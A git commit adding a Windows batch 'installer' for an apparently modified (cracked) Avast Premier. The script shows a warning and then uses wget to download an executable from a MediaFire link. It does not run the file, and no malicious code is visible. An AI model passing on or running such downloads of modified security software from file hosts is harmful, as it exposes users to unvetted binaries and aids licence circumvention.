4bd8db584069481d7d0085b8db731ad6352bfec9
KingOfMezi <42187093+KingOfMezi@users.noreply.github.com>
2019-03-07 19:48:20 -0500

    Modified-Avast Premier
    Install as a normal modified Avast Premier program
    You must install winrar. I can find it on the official website here: https://www.winrar.es/descargas
    It works very well for Windows XP, Windows7, Windows8, Windows8.1 and Windows 10.

---
+++ Modified-Avast Premier/Install Avast.bat
@@ -0,0 +1,37 @@
+@echo off
+echo.
+echo AVISO
+echo =====================================================================
+echo.
+echo USTED Esta Eligiendo Hacer Todas Estas Modificaciones...
+echo Bajo Su Propio Riesgo....
+echo Si Brikeaa Su ACC,Me Reire De Usted. 
+echo.
+echo Funciona Muy Bien Para WindowsXP,Windows7,Windows8,Windows8.1 y Windows 10.
+echo.
+echo ======================================================================
+echo Click ENTER Para Continuar...
+pause > nul
+
+cls
+echo.
+echo Source Github: https://github.com/KingOfMezi
+cls
+
+cls
+echo.
+echo Next step:
+echo Downloading the Files...
+echo.
+wget http://download1511.mediafire.com/8crog8oz4weg/hp3j7gp2vznnd3r/Installer+Avast+Premier.exe
+echo.
+echo.
+echo [[[[  SSSSS  TTTTTTT  OOOOO          EEEEEEE       ]]]] 
+echo [[   SS        TTT   OO   OO nn nnn  EE      zzzzz   ]] 
+echo [[    SSSSS    TTT   OO   OO nnn  nn EEEEE     zz    ]] 
+echo [[        SS   TTT   OO   OO nn   nn EE       zz     ]] 
+echo [[[[  SSSSS    TTT    OOOO0  nn   nn EEEEEEE zzzzz ]]]]
+echo.
+echo Downloaded Correctly...
+echo Click ENTER Para Salir....
+pause > nul
